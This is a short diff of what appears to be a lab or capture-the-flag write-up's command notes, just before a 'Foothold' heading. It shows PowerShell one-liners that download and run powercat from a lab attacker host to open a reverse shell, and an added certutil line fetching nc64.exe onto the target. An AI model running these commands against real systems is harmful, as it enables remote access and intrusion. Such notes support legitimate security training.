@@ -143,6 +143,8 @@ powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://10.10.1
 powershell.exe  "IEX ((New-Object Net.WebClient).DownloadString('http://10.10.14.214/powercat.ps1')); powercat.ps1 -c 10.10.14.214 -p 443 -ep;"
 
 powershell.exe -c iwr http://10.10.14.214/nc64.exe -outfile nc.exe
+
+certutil -urlcache -split -f "http://10.10.14.214/nc64.exe" C:\users\oliver\documents\nc64.exe
 ```
 
 ### Foothold 
